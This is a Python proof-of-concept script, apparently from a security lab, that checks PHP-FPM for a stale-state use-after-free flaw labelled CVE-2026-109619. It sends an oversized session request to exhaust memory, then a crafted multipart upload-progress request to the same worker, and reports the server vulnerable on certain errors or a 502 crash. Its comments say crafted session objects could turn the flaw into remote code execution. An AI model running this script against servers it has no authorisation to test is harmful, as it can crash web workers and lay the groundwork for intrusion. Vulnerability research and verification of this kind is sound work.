#!/usr/bin/env python3
"""
CVE-2026-109619 — Chain E: FPM Session Decode OOM → Stale BG → UAF
Verifies that session_start() OOM leaves BG(unserialize) dirty,
and the next request's rfc1867 upload_progress consumes it.

Requirements:
  - PHP-FPM with session.upload_progress.enabled = On (default)
  - memory_limit ≤ 32M (lab default)
  - pm = static, pm.max_children = 1 (ensures same worker)
  - A ~30MB session file (see lab/setup.sh)
  - An endpoint that calls session_start()

Usage:
  python3 verify_fpm_stale_state.py --target http://host:port

Expected output:
  PRODUCER: OOM during session decode ✓
  CONSUMER: "Session object destruction failed" during Request Startup ✓

For authorized security research only.
"""
import argparse
import socket
import sys
import time
import uuid
from urllib.parse import urlparse


def send(host, port, data, timeout=30):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(data)
    s.settimeout(timeout)
    r = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            r += d
        except:
            break
    s.close()
    return r


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--session-path", default="/session_oom.php")
    ap.add_argument("--upload-path", default="/index.php")
    ap.add_argument("--producer-sid", default="hugesession000000000000000")
    ap.add_argument("--consumer-sid", default="consumerpoisoned0000000000")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80

    print("CVE-2026-109619 — Chain E: FPM Stale BG Verification")
    print(f"Target: {args.target}\n")

    # Producer
    print("[1] PRODUCER: session_start() decode ~30MB session → OOM...")
    req1 = (
        f"GET {args.session_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={args.producer_sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    resp1 = send(host, port, req1, timeout=60)
    body1 = resp1.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp1 else b""

    if b"memory" not in body1.lower():
        print("    FAIL: No OOM. Check session file size and memory_limit.")
        print("    HINT: setup.sh does not create the ~30MB session file.")
        print("    Create it manually, e.g.:")
        print("      python3 poc/make_huge_session.py --target http://127.0.0.1:18080")
        print("    The file is truncated to 0 bytes after the producer OOM,")
        print("    so it must be recreated before each run (one-shot).")
        return 1
    print("    OK: OOM triggered during php_var_unserialize")

    time.sleep(0.05)

    # Consumer
    print("[2] CONSUMER: upload_progress to same worker...")
    boundary = "V"
    body2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode()
    req2 = (
        f"POST {args.upload_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body2)}\r\n"
        f"Cookie: PHPSESSID={args.consumer_sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body2

    resp2 = send(host, port, req2, timeout=15)
    body2_text = resp2.decode("latin1", "replace") if resp2 else ""

    if "destruction failed" in body2_text or "Failed to decode" in body2_text:
        print("    OK: Stale BG state consumed during rfc1867!")
        print()
        print("RESULT: VULNERABLE")
        print("  BG(unserialize) leaked across FPM requests.")
        print("  Consumer's rfc1867 handler accessed stale session state.")
        print("  With crafted session objects → __destruct UAF → RCE.")
        return 0
    elif "502" in body2_text[:50]:
        print("    OK: Worker crashed (502) — UAF triggered!")
        print("\nRESULT: VULNERABLE")
        return 0
    else:
        print(f"    Response: {body2_text[:100]}")
        print("\nRESULT: Not triggered (may need same-worker guarantee)")
        return 1


if __name__ == "__main__":
    sys.exit(main())
